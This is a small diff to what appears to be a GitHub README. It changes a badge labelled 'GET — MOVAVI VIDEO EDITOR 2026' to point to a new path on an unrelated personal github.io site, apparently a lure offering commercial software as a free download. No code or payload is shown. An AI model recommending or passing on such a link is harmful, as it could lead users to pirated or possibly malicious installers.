@@ -4,7 +4,7 @@
 <img src="https://cdn.dekudeals.com/images/29c5765db2d6c1abf1883c67c669f8b185f992d9/w500.jpg" width="500">
 </p>
 
-[![GET — MOVAVI VIDEO EDITOR 2026](https://img.shields.io/badge/GET-MOVAVI%20VIDEO%20EDITOR%202026-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/)
+[![GET — MOVAVI VIDEO EDITOR 2026](https://img.shields.io/badge/GET-MOVAVI%20VIDEO%20EDITOR%202026-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/Movavi-2026)
 
 ---
 
